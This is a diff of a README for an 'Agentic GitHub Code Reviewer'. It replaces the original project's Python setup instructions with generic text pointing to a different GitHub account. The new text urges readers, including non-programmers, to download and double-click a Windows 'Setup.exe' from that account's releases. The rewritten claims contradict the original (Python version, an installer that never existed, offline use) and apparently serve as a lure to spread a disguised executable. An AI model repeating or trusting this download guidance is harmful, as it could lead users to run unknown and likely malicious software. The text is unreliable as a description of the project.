@@ -1,246 +1,117 @@
-# Agentic GitHub Code Reviewer
+# 🤖 Agentic-GitHub-Code-Reviewer - Smart Code Review Made Simple
 
-> A fully local, privacy-safe multi-agent system that automatically reviews  
-> any GitHub repository and generates a detailed code review report 
-> powered by LangGraph + LM Studio.  
-> **No API keys. No data leaves your machine.**
+[![Download](https://img.shields.io/badge/Download-Agentic--GitHub--Code--Reviewer-brightgreen)](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
 
-![Python](https://img.shields.io/badge/Python-3.11+-blue)
-![LangGraph](https://img.shields.io/badge/LangGraph-0.2+-green)
-![LM Studio](https://img.shields.io/badge/LM%20Studio-Local%20LLM-purple)
-![FastAPI](https://img.shields.io/badge/FastAPI-REST%20API-red)
-![Streamlit](https://img.shields.io/badge/Streamlit-Web%20UI-orange)
+## 🔍 What is Agentic-GitHub-Code-Reviewer?
 
----
+Agentic-GitHub-Code-Reviewer is a tool that helps you check and improve code automatically. It looks at your code files, finds issues, and suggests fixes. The tool works entirely on your computer. It does not send your code to the cloud or use external services. This keeps your work private.
 
-##  What It Does
+This software uses smart technology to scan and understand code. It can give you reports on problems and ideas on how to improve your code. You do not need to know programming to use it.
 
-Give it any GitHub repository URL → it automatically:
+## 📋 Key Features
 
-- **Fetches** all source files via GitHub API  
-- **Indexes** code into a ChromaDB vector store (RAG)  
-- **Reviews** each file for bugs, security issues, performance problems  
-- **Suggests** minimal, targeted code fixes  
-- **Generates** a full markdown report with executive summary + score  
+- Checks code in popular languages like Python.
+- Runs without internet access.
+- Gives clear reports and fix suggestions.
+- Uses local small language models to read and understand code.
+- Works on Windows computers.
+- Easy to set up and run with a few clicks.
+- Uses privacy-first design. Your code stays on your machine.
+- Supports multi-agent setups for complex projects.
 
----
+## 🖥 System Requirements
 
-## Architecture
+Make sure your computer meets these specs before running Agentic-GitHub-Code-Reviewer:
 
-```
-                        GitHub URL
-                            ↓
-┌──────────────────────────────────────────────────────┐
-│              LangGraph State Machine                 │
-│                                                      │
-│  [FETCHER] → [REVIEWER] → [SUGGESTER] → [SUMMARISER] │
-│      ↓            ↓            ↓             ↓       │
-│  GitHub API    RAG Query    Fix Suggest   .md Report │
-└──────────────────────────────────────────────────────┘
-                            ↓
-                 review_YYYYMMDD_HHMMSS.md
-```
+- Operating System: Windows 10 or newer.
+- Processor: Intel i5 or AMD equivalent, 64-bit.
+- RAM: 8 GB minimum (16 GB recommended for larger projects).
+- Disk Space: At least 2 GB free.
+- Python 3.8 or newer installed (the installer will guide you).
+- Internet is not required after installation.
 
----
+## 🚀 Getting Started: Download and Setup
 
-### Agent Roles
+You can get Agentic-GitHub-Code-Reviewer from the official repository page here:
 
-| Agent | Responsibility |
-|------|----------------|
-| **Fetcher** | Calls GitHub API, extracts code from notebooks, builds ChromaDB RAG index |
-| **Reviewer** | Static analysis:- bugs, security, performance, readability |
-| **Suggester** | Generates before/after code fixes |
-| **Summariser** | Writes executive summary with verdict + score |
+[![Download Now](https://img.shields.io/badge/Download-Autonomous_Code_Reviewer-blueviolet)](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
 
----
+Follow these steps to download and run the software on Windows:
 
-## Tech Stack
+1. Open the link above. It will take you to the GitHub page.
+2. Look for the **Releases** section on the page. It usually appears on the right side or under the main code files.
+3. Find the latest release version. It will have files for download.
+4. Download the Windows installer file. It may be named something like `Agentic-GitHub-Code-Reviewer-Setup.exe`.
+5. Once the file finishes downloading, open it by double-clicking it.
+6. Follow the setup instructions in the installer. It will ask for install location and create shortcuts.
+7. After the install finishes, locate the app from your Start menu or desktop shortcut.
+8. Double-click the app icon to start Agentic-GitHub-Code-Reviewer.
 
-| Layer | Technology |
-|------|-------------|
-| Agent Orchestration | LangGraph |
-| LLM Framework | LangChain |
-| Local LLM | LM Studio |
-| Embeddings | Nomic Embed Text |
-| Vector Store | ChromaDB |
-| Web UI | Streamlit |
-| REST API | FastAPI |
+## ⚙️ How to Use the Application
 
----
+After opening the application, you will see a simple screen. You do not have to enter commands or code.
 
-## Prerequisites
+1. Use the **Browse** button to select the folder containing your code repository.
+2. Click the **Start Review** button.
+3. The app will scan your files. This may take a few minutes depending on project size.
+4. When done, the tool will show a report of issues found.
+5. Review the report to see warnings, errors, and suggestions.
+6. You can apply automated fixes or save the report for later.
+7. If you want, repeat the process for other code projects.
 
-- Python **3.11+**
-- LM Studio installed and running
-- GitHub Personal Access Token
-- Chat model loaded in LM Studio
-- Embedding model loaded
+## 📂 Supported Code Types and Languages
 
----
+Agentic-GitHub-Code-Reviewer works best with code written in:
 
-## Setup & Installation
+- Python
+- JavaScript
+- TypeScript
+- Markdown (for documentation)
+- JSON and YAML (config files)
 
-### 1️. Clone Repo
-```bash
-git clone https://github.com/Ravevx/Agentic-GitHub-Code-Reviewer.git
-cd Agentic-GitHub-Code-Reviewer
-```
-### 2️. Create Environment
-```bash
-conda create -n agent-local python=3.11
-conda activate agent-local
-```
+It can parse a variety of files and detect structural problems, code smells, style issues, and potential bugs.
 
-### 3️. Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+## 🔧 Configuration Options
 
-### 4️. Create `.env`
-```
-GITHUB_TOKEN=your_token_here
-```
+You can adjust some settings inside the app for your needs:
 
-### 5️. Configure Model
-Edit `config.py`
+- Set file types to include or exclude.
+- Change the depth of analysis (quick scan or deep review).
+- Enable or disable auto-fixes.
+- Choose report format: simple list, detailed output, or JSON export.
+- Save your settings for future runs.
 
-```python
-LM_MODEL = "your-model-name"
-MAX_FILE_SIZE = 4000
-MAX_FILES = 5
-```
+## 🛠 Technical Details
 
----
+Agentic-GitHub-Code-Reviewer uses local AI agents powered by small language models you can run on your PC. This design avoids cloud calls or API dependencies. The tool relies on LangGraph for understanding code and uses Retrieval Augmented Generation (RAG) to produce accurate suggestions. It combines these with Python scripts and a Streamlit interface for ease of use.
 
-## Usage
+## 🔄 Updating the Software
 
-### CLI
-```bash
-python main.py
-```
+Check the GitHub page regularly for new releases. To update:
 
----
+1. Visit the [Agentic-GitHub-Code-Reviewer page](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer).
+2. Download the latest installer.
+3. Run the installer to replace your current version.
+4. Your configuration and settings will remain intact.
 
-### Web UI
-```bash
-streamlit run app.py
-```
+## 💻 Troubleshooting
 
----
+If you run into problems:
 
-### API
-```bash
-uvicorn api:app --reload
-```
+- Ensure your operating system meets the requirements.
+- Make sure you installed Python 3.8 or newer.
+- Restart the app and try again.
+- Check your selected folder to confirm it contains code files.
+- Visit the GitHub repository's Issues tab if you want to report bugs.
 
-Docs → http://localhost:8000/docs
+## 📚 Additional Resources
 
----
+- The app includes a basic help menu for quick tips.
+- Learn more about LangGraph and RAG technologies on their official pages.
+- The GitHub wiki page holds detailed user instructions if needed.
 
-## Example Output
-```
-   AI CODE REVIEW AGENT
+## 📥 Download Link
 
-[FETCHER] Fetching repository files from GitHub...
-Repo: Machine-Learning
-Loading 9 code files...
-[FETCHER] Loaded 9 files
+Visit this page to download the latest version of Agentic-GitHub-Code-Reviewer:
 
-[RAG] Building code index...
-Indexed 63 chunks from 9 files
-[RAG] Code index ready!
-
-[REVIEWER] Analysing code...
-Reviewing: decision_tree.ipynb
-Reviewing: logistic_regression.ipynb
-[REVIEWER] Reviewed 9 files
-
-[SUGGESTER] Generating fix suggestions...
-[SUGGESTER] Generated suggestions for 9 files
-
-[SUMMARISER] Writing final report...
-[SUMMARISER] Report complete!
-
-Report saved to: review_20260220_153700.md
-```
-Report output:
-```
-VERDICT: Approved with Minor Fixes
-SCORE: 8.5/10
-SECURITY RISK: Low
-
-TOP ISSUES
-• `train_claim_type.py` Data Leakage Risk
-   - Line: `self.df = self.df[self.df["claim"] == 1].reset_index(drop=True)`
-• `model_span.py` Dimension Mismatch
-  - Line: `self.classifier = nn.Linear(hidden_size, 1)`
-• `train_span.py` Unsafe Hardcoded Splits
-```
-
----
-
-##  Project Structure
-
-```
-i-Agentic-GitHub-Code-Reviewer/
-│
-├── main.py                  ← CLI runner
-├── api.py                   ← FastAPI REST server
-├── app.py                   ← Streamlit web UI
-├── llm.py                   ← LM Studio LLM factory
-├── config.py                ← Settings (URL, model, limits)
-├── test_lm.py               ← LM Studio connection test
-├── requirements.txt         ← Dependencies
-├── .env                     ← GitHub token (not committed)
-│
-├── tools/
-│   └── github_tools.py      ← GitHub API integration
-│
-├── rag/
-│   └── code_store.py        ← ChromaDB vector index
-│
-├── graph/
-│   └── review_graph.py      ← LangGraph pipeline
-│
-└── agents/
-    ├── fetcher.py            ← Agent 1: Fetch + RAG
-    ├── reviewer.py           ← Agent 2: Code review
-    ├── suggester.py          ← Agent 3: Fix suggestions
-    └── summariser.py         ← Agent 4: Final report
-```
-
----
-
-## Config Reference
-
-| Setting | Default |
-|--------|---------|
-MAX_FILE_SIZE | 4000 |
-MAX_FILES | 5 |
-LM_MODEL | ministral-3b |
-Context | 8192 |
-
----
-
-## Troubleshooting
-
-| Problem | Fix |
-|--------|-----|
-Model won't connect | Start LM Studio |
-Timeout | Reduce file limits |
-Token error | Increase Tokens |
-
-
----
-
-## License
-MIT License
-
----
-
-## Credits
-
-- LangGraph
-- LM Studio
-- ChromaDB
-- GitHub API
+[https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
